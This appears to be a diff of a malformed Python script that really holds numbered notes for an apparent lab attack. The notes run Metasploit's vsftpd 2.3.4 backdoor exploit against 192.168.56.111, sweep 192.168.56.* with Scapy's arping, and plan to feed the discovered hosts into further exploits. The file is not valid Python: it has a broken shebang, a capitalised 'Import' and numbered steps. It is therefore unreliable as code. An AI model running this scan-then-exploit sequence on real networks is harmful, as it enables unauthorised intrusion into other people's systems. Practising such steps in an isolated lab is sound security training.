@@ -1,17 +1,19 @@
 !/usr/bin/env python3
 Import sys
 
-#Msfconsole
-Search vsftpd
-Use exploit/unix/ftp/vsftpd_234_backdoor
-Set rhost 192.168.56.111
-Run exploit
+#define function to launch msfconsole
+1. Msfconsole
+2. Search vsftpd
+3. Use exploit/unix/ftp/vsftpd_234_backdoor
+4. Set rhost 192.168.56.111
+5. Run exploit
 
-#run scapy
-Scapy
-
-#discover hosts on network with arp scan
+#define function to launch scapy
+1. Scapy
+2. discover hosts with arp scan
 arping("192.168.56.*")
+
+#use ips detected to set as rhosts in further msfconsole exploits
 
 
 
